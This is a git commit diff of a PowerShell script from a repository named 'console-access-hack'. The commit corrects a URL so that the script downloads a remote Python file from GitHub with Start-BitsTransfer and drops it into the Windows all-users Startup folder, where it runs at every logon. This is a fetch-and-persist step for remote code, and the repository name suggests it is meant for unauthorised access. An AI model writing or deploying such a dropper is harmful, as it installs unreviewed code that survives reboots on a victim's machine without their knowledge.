6ed1a1d1e202719ff29cc25ea6ed70a08aa955d2
keltonxgame <101152125+keltonxgame@users.noreply.github.com>
2022-12-28 12:44:28 -0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/keltonxgame/console-access-hack/main/console.pyn"
+$url = "https://raw.githubusercontent.com/keltonxgame/console-access-hack/main/console.py"
 $dest = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 
 Start-BitsTransfer -Source $url -Destination $dest 
